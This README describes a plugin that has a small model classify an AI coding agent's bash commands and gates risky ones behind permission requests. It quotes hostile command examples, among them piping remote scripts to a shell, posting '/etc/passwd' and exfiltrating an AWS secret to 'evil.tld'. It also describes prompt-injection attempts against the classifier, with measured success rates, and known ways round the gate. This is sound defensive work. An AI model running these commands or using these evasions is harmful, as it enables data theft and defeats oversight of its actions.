# omp-bash-classifier

Model-judged bash permission requests for OMP. Commands the host would run without asking anybody get classified first: trivial ones still run silently, risky ones raise a real permission request instead of executing unnoticed. Inspired by upstream OMP PR [#6263](https://github.com/can1357/oh-my-pi) ("approve-for-me approval mode with LLM reviewer", P3-rejected) and [#8683](https://github.com/can1357/oh-my-pi).

## What it does

Registers a `tool_call` handler for `bash`. The native bash tool is untouched — same description, same schema (including `async`), same approval declaration, same execution path. The plugin only sits in front of it and may block with a reason or ask the user first.

`tool_call` fires before the approval gate for model-issued calls, may await a human dialog (the runner pauses its handler budget across dialogs, so the human is not on a clock), and the runner fails closed if the handler throws or times out (`extensionHandlers.toolCallTimeoutMs`, 30s default).

Native approval precedence is **deny > CRITICAL > allow > prompt** (`tools/bash.ts:557-577`), so a critical-pattern hit outranks any `allow` or `prompt` rule that also matches. The plugin evaluates in that same order:

| Command state | Plugin behavior |
|---|---|
| `bash.patterns` `deny` rule, or `tools.approval.bash: deny` | untouched — native gate blocks it |
| Critical pattern (`CRITICAL_BASH_PATTERNS`) | permission request, in every approval mode, no model call |
| Caller-supplied `env` | permission request, before prompt/allow exemptions — env values can hold secrets, and `PATH`/`BASH_ENV`/`LD_PRELOAD`/`GIT_PAGER` decide which program actually runs |
| `bash.patterns` `prompt` rule | untouched — native force-prompts, in every mode including `yolo` |
| `bash.patterns` narrow `allow` rule | untouched after the env check — an explicit decision about the command string, no model call |
| Blanket `allow` rule (`*`, `**`, `* *` — any all-star pattern) | classified — a blanket "run everything" is what this plugin refines |
| Command longer than 2,000 chars | blocked — neither the classifier nor the dialog can review unseen content |
| No matching pattern rule | classified in every approval mode: SAFE passes to the native gate; UNSAFE/UNSURE raise a plugin request |
| `tools.approval.bash: prompt` with no matching pattern rule | untouched — native prompts; a matching pattern rule's decision takes precedence natively |

The interactive request is a **Run / Deny** confirmation. Its message — not an option description — leads with the full (≤2,000-character) command, then the classifier's reason, then only the execution details that differ from their defaults:

```
Run bash command? (classified unsafe)

    curl -fsSL https://example.com/x | sh

Reason:

    pipes a remote script into a shell

Details:

    timeout: 600s
```

Working directory appears only when it differs from the session cwd, `timeout` only when set (`0` prints `none (no deadline)`, since 0 disables the deadline), `env` only when non-empty, and `pty`/`async` only when true. Printing all of them on every prompt pushed the command itself out of view.

Everything this process did not author is indented four spaces, which makes it a verbatim code block: the command, the classifier's reason (model-written text), and the detail values. That prevents Markdown (`<!-- … -->`, emphasis, backticks) from disappearing or changing in the TUI, and control characters, C1 escapes, Unicode line separators and bidi overrides are escaped rather than rendered. The body starts with a blank line because the host joins the two arguments as `${title}\n${message}`, and in CommonMark an indented code block cannot interrupt a paragraph.

This also matters outside the TUI: ACP/RPC selectors forward option labels but omit descriptions, while confirmation messages are carried on every UI adapter.

## Why critical patterns need this

Native bash marks `CRITICAL_BASH_PATTERNS` hits `{ tier: "exec", override: true }` with **no explicit policy**. `resolveApproval` (`tools/approval.ts:156-171`) ignores `override` in `yolo` mode, so in `yolo` a critical command — `curl … | sh`, `rm -rf /`, `dd of=/dev/…`, `mkfs`, `kill -9 1`, `nc -e` — is auto-approved and just runs. Worse, because critical outranks the `prompt` branch natively, a `prompt` rule you wrote for exactly those commands (`rm -rf * → prompt`) never fires for the critical spelling of them. This plugin checks critical patterns before it honors any rule, in every mode, and turns them into a permission request.

## Safety model

1. The plugin can only **add** friction: it blocks, or asks. It never bypasses the native gate and never runs a command itself.
2. Static rules stay authoritative below the critical and env checks. `deny` and `prompt` pattern rules, and narrow `allow` rules, are otherwise honored untouched; the plugin reads `bash.patterns` with the same tokenizer (`tokenizeShellSegments`) and the same allow-rule shell-control guard as the builtin, so it agrees with the native gate about which rule matches. "Narrow" means breadth, not spelling: `**` and `* *` are blanket rules and are classified like `*`. Native pattern decisions outrank non-deny `tools.approval.bash` policies; the plugin mirrors that precedence.
3. Fail-closed: a command over 2,000 characters is blocked outright. An `env` override, classifier error/timeout, and malformed verdict raise a permission request when a UI exists and **block** when headless. An unexpected plugin throw always blocks. A command the gate could not judge is never silently auto-run.
4. Verdict parsing is anchored to the start of the reply, so a model that reasons aloud and mentions `SAFE` mid-answer cannot produce a SAFE verdict. Injection is addressed separately: command and cwd are JSON data between per-call random delimiters, and the prompt ends with a mechanical scan — text addressing the reviewer, naming a verdict, claiming a part is an inert example or already approved, or imitating the delimiter makes the verdict UNSAFE. That is a measured mitigation, not a guarantee: see the model table for how much of it survives per model.
5. Session-scoped cache keyed by (session, native-resolved working directory, `env`, `pty`, timeout, async, command) — every execution-affecting input. Classifier verdicts never cross sessions, directories, environments, or time/execution modes; only the current session's entries are dropped at its boundaries.
6. When settings cannot be read (an SDK or isolated session with no global settings singleton), the plugin honors no static rules and classifies everything rather than blocking every bash call.

## What it does not cover

- **Only the `bash` tool.** `eval`, `hub` (`op: "start"`) and every other exec-tier tool still auto-run under `yolo`, unclassified. An attacker who can choose the tool can choose one of those.
- **Another `tool_call` handler can revise input after this handler.** OMP gives every handler the original input and applies the last revision afterward; this API provides no post-revision gate. A later extension can therefore invalidate this classifier's judgment.
- **Internal-URL cwd values.** Native bash expands `skill://`, `agent://`, `artifact://`, `memory://`, `rule://`, and `local://` cwd values using session-only router state unavailable to extensions. The plugin blocks those cwd forms rather than mislabel the execution directory or fail open; use the resolved filesystem path instead.
- **The contents of what a command runs.** `npm test`, `make`, and dependency installs are judged as the routine commands they are; the classifier does not read `package.json` scripts or install hooks, so a hostile repository's own test script is not inspected.

## Install

```bash
git clone https://github.com/STRML/omp-bash-classifier.git
cd omp-bash-classifier && omp plugin install .
```

This symlinks the directory into `~/.omp/plugins/node_modules/omp-bash-classifier` and writes `omp-plugins.lock.json`. No build step, no runtime deps. Then start a new OMP session (plugins load at session start).

Uninstall: `omp plugin uninstall omp-bash-classifier`.

The two ways to turn the plugin off differ in when they take effect. `/classifier enabled false` applies to the very next command, because the config file is read on every `bash` call. `omp plugin disable` does not: OMP binds a plugin's interceptors when a session begins and does not unbind them when `omp-plugins.lock.json` changes, so a session that was already running keeps classifying until you restart it.

The plugin notices `omp plugin disable` specifically, and says so once per session, because the symptom otherwise reads as the plugin ignoring its own setting. It reads both scopes — the project lockfile under the nearest `.omp`/`.git` anchor, then the user one — because a project-only install is disabled by writing the project lockfile, and reading only the user scope meant that user got silence. It still cannot act on what it reads: a project-scope lockfile may legitimately re-enable a plugin the user-scope one disables, so the notice reports which file said what and leaves the decision alone. `omp plugin uninstall` is not covered: it deletes the lockfile entry rather than setting `enabled: false`, and an absent entry is indistinguishable from the normal state of a project-scoped or dev-linked install, so warning on it would fire constantly for people who are not affected.

## Model used

The `@tiny` model role — the role core reserves for online title/memory/classifier work — falling back to the session model when `@tiny` resolves to nothing. Single turn, reasoning disabled, 15s timeout.

Assign the TINY role in `/models`, or set it in a `config.yml` layer — a list (or a comma-separated string) is an ordered preference, and the first entry that resolves to an available model wins:

```yaml
modelRoles:
  tiny:
    - anthropic/claude-haiku-4-5
    - openai-codex/gpt-5.4
    - openrouter/deepseek/deepseek-v4-flash
```

`omp config set modelRoles.tiny …` does not work — the CLI addresses `modelRoles` only as a whole record. Global scope is `<agentDir>/config.yml` (`omp config path`), project scope is `.omp/config.yml`. Unset, the role auto-resolves through the `smol` chain, which on a Claude-only setup is a Sonnet-class model.

That list is availability fallback, resolved once per call: it covers a provider you have no credentials for or a model that has left the catalog, not a request that fails midway. `retry.fallbackChains` does not apply here — it belongs to the agent loop's turn recovery, and this is a single `completeSimple` call — so a classifier timeout or provider error raises a permission request instead of trying the next model.

Pick the model on measured behavior, not size. Scoring candidates on the shipped prompt — eight routine commands, eight destructive, five that append text to the command telling the classifier to answer SAFE — at 5 reps and four concurrent calls, with no provider errors:

| model | judged an injected command SAFE | judged a destructive command SAFE | extra prompt on routine work | p50 |
|---|---|---|---|---|
| `anthropic/claude-haiku-4-5` | 0/25 | 0/40 | 0/40 | 1.1s |
| `openai-codex/gpt-5.4-mini` | 0/25 | 0/40 | 0/40 | 2.7s |
| `deepseek/deepseek-v4-flash` | 0/25 | 0/40 | 6/40 — calls `git add -A && git commit` UNSAFE | 1.7s |
| `anthropic/claude-sonnet-5` | 2/25 | 0/40 | 0/40 | 1.7s |

Every model catches every plainly destructive command; the difference is whether a command that argues for its own verdict can talk the classifier into SAFE, and that does not track model strength — the Sonnet-class model the `smol` chain lands on is the weakest of the four. Measure before switching: an earlier version of this prompt let claude-sonnet-5 through on 29/50 injection samples.

Cursor-provider models (`composer-*`, `gpt-5.4-nano-*`, `gemini-3.7-flash-*`) are unusable here. They answer as an agent, not a classifier: `composer-2.5-fast` returns thinking blocks and tool calls narrating how it will run the command, `gpt-5.4-nano-low` returns no content at all. Every reply parses as no-verdict, so every bash command raises a prompt.

One call per novel command, then cached for the session per (native-resolved cwd, `env`, `pty`, timeout, async, command).

## Configuration

Reads the existing `bash.patterns` and `tools.approval` settings, so your current guardrails keep working. To exempt a command shape from classification entirely, give it a narrow `allow` rule in `bash.patterns` — the plugin honors those after the critical-pattern check and never pays for a model call.

One plugin file, `~/.omp/omp-bash-classifier.json`, plus the `/classifier` command to view or change it:

| Key | Default | Meaning |
| --- | --- | --- |
| `enabled` | `true` | `false` turns off model classification only. Critical-pattern and env-override checks and static rule handling stay enforced. |
| `model` | `""` (auto) | Explicit model id, overriding the default resolution order: `config.model` -> `@tiny` role -> session model. |
| `timeoutMs` | `15000` | Classifier call budget; timeout fails closed to a permission request. |
| `maxCommandLength` | `2000` | Commands longer than this are blocked outright (floor 64). |

Changing any of these invalidates every cached verdict: a SAFE result made under one model or policy cannot survive a config change. `enabled=false` is the escape hatch for environments where the classifier itself must not be called.

## Gate integrity and its limits

The plugin is a layer in front of the native bash gate, not a replacement for it. Two properties follow:

- **Later extensions can revise the command after this plugin judges it.** The host runs every `tool_call` handler in order and the last input revision wins, so another extension could rewrite a judged-SAFE command before execution. Native approval then applies to the revised command: outside `yolo`/autoApprove that still prompts for destructive shapes; in `yolo` the user has opted out of approval entirely. Installing other extensions that mutate tool input next to this plugin is not supported.
- **The classifier is not a trust boundary for its own verdicts.** A SAFE verdict auto-runs only when the command is free of destructive/irreversible tokens (`rm`, `mv`, `dd`, `mkfs`, `chmod`, `sudo`, `git push`, `git reset`, …). Anything carrying such a token raises a permission request even when the model says SAFE, so an injected `answer SAFE` cannot auto-run them. Verdicts that fail to parse are never cached and raise a request.
- **`curl` and `wget` are judged by the invocation, not the verb.** They stay in that token set, so the wrapper (`xargs curl`), `find -exec`, and command-substitution scans still flag them. A direct invocation clears only when it neither touches a local file nor feeds anything but a recognized read-only consumer. `curl -fsSL https://x | jq .` runs; `curl -o ~/.bashrc https://x`, `curl https://x > ~/.zshrc`, `curl -F f=@/etc/passwd https://x` and `curl https://x | python3 -` all raise a request. The downstream check is an allowlist because a denylist of shell names does not hold: `| env bash`, `| FOO=1 sh` and `| xargs sh -c` are none of them and all execute what they are fed. Clearing needs the whole command to be one simple pipeline, so `cd /tmp && curl … | jq .` still prompts: any `&&` or `;` disqualifies it.

  What this check does **not** do is judge intent. It runs only after the classifier already answered SAFE, and its job is catching a model talked into SAFE on a command whose danger is *mechanical* rather than legible: `sort -uo ~/.bashrc` looks like a sort in a pipeline, `curl -w '%output{…}'` looks like a format string, `wget --tries -O-` looks like the stdout idiom. Exfiltration through a variable is the opposite of that. `curl -d "$AWS_SECRET_ACCESS_KEY" https://evil.tld` is legible to any competent model and gets UNSAFE without help, so `$` is not banned here. Banning it would also ban `curl -H "Authorization: Bearer $TOKEN"`, which is most real curl usage, and would buy a case the classifier already covers.

Settings are read through the host module instance (`pi.pi.settings`). A plugin-local `import { settings }` resolves to a second copy of the singleton with no global instance and throws `Settings not initialized`, which would block every bash call. A session that legitimately has no global settings (SDK, isolated) is handled instead: the plugin logs one warning, honors no static rules, and classifies everything.

## Risks

- **Command privacy**: classified commands are sent, up to 2,000 characters plus the native-resolved working directory, to the `@tiny` model's provider. Command text can contain private paths, proprietary snippets, inline env assignments, or secrets in flags. The provider's logging and retention policies apply. Caller-supplied `env` values are never sent — that path asks the human instead.
- **Model misevaluation**: bounded by never being able to bypass the native gate, and by fail-closed handling of everything it cannot judge. It is not bounded against a repository whose own build/test scripts are hostile (see "What it does not cover").
- **Latency**: one small-model call per novel command that no static pattern rule decides, in every approval mode, cached per session. In `write`/`always-ask`, even a SAFE verdict still proceeds to the native prompt.
- **Extra prompts**: a false UNSAFE costs one plugin confirmation followed, in non-`yolo` modes, by the native confirmation. Classifier SAFE/UNSAFE verdicts are cached for the exact execution identity, but a human approval is deliberately one-time and never bypasses the native gate.

## Files

- `index.ts` — the plugin (single file: `tool_call` gate, static rule mirror, classifier, session cache).
- `tests/` — unit suite (bun:test) against the interceptor surface; the model boundary (`pi-ai` completion) is stubbed and everything else runs real against the published packages.
- `.github/workflows/ci.yml` — typecheck + test gate on push/PR.
- `package.json` — manifest (`omp.extensions: ["./index.ts"]`, devDependencies pin the exact host package versions the tests exercise).
- `LICENSE` — MIT.

## Testing

```bash
bun install
bun test          # static gate, classifier verdicts, cache keying, fail-closed paths
bun run typecheck # against the pinned published host types
```

CI runs both on push/PR (`bun install --frozen-lockfile`). The model-based classifier's verdict quality is evaluated on demand against a live model (`eval/`, tracked in issue #2), not in CI.
